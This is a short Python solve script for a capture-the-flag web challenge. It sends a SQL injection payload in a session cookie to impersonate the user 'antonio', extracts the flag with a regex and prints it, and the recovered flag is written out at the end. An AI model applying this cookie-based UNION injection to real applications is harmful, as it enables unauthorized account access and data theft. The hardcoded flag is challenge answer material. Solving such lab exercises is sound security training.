import requests
import re


site = "http://todo.challs.olicyber.it/"

s = requests.session()

cookie = {"session" : "' UNION SELECT id, username FROM users WHERE username='antonio' --"} # la query diventa 
# WHERE sessions.id = ''
# UNION
# SELECT id, username FROM users WHERE username='antonio' -- '; <-- ci permette di leggere la flag, conosciamo lo username dell'utente con la flag

s.post(f"{site}/register", data={"username": "zamzamzamuu", "password":"zamzamzamuu", "confirm_password" : "zamzamzamuu"})
r = s.get(f"{site}/todo", cookies=cookie).text

match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)


#flag{t0d0_l3arn_pr3par3d_st4t3m3nts_c8574680}